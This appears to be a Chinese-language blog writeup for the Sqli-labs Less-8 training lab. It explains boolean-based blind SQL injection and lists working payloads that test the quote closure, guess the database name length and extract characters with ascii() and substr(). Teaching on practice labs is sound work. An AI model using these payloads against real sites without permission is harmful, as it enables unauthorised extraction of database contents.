---
title: Sqli-labs Less-8 Writeup
date: 2026-11-16
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web]
---
## 题目描述
页面提示输入数字型 ID，但无论输入什么，页面都只显示 `You are in...` 或者没有任何有效回显，且不会抛出 SQL 报错信息。
结合之前关卡的经验，这是典型的 **布尔盲注（Boolean-based Blind SQL Injection）** 关卡。

## 解题思路
1. **判断闭合方式**：输入 `?id=1'` 页面正常（或者显示特定欢迎语），输入 `?id=1' and 1=1 --+` 正常，输入 `?id=1' and 1=2 --+` 页面内容改变（例如缺少 You are in...）。确认闭合符为单引号 **`'`**。
2. **盲注原理**：由于无法使用 `union select` 回显数据，我们只能构造 `and` 条件。如果条件成立（True），页面正常显示；如果条件不成立（False），页面异常。
3. **猜解数据库名长度**：
   输入 `?id=1' and length(database())=8 --+`，页面正常，说明数据库名长度为 8。
4. **逐位猜解字符（二分法）**：
   利用 `ascii()` 和 `substr()` 函数，判断字符的 ASCII 码范围。
   例如：`?id=1' and ascii(substr(database(),1,1))>100 --+`
5. **自动化脚本**：纯手工盲注效率极低，通常使用 Python 编写脚本，或者直接使用 SQLMap 跑。

> 知识点：布尔盲注的核心在于寻找页面“状态差异”。即使页面没有明显数据，哪怕是一个字符的不同、或者 HTTP 状态码的不同，都可以作为判断条件真假的依据。

## 通关 Payload (手工测试基础)

### 1. 测试闭合与真假条件
```sql
?id=1' and 1=1 --+    (页面正常)
?id=1' and 1=2 --+    (页面异常)
```

### 2. 猜解当前数据库名长度

```sql
?id=1' and length(database())=8 --+ 
```

### 3. 猜解数据库名第一个字符（ASCII码 > 100）

```sql
?id=1' and ascii(substr(database(),1,1))>100 --+
```
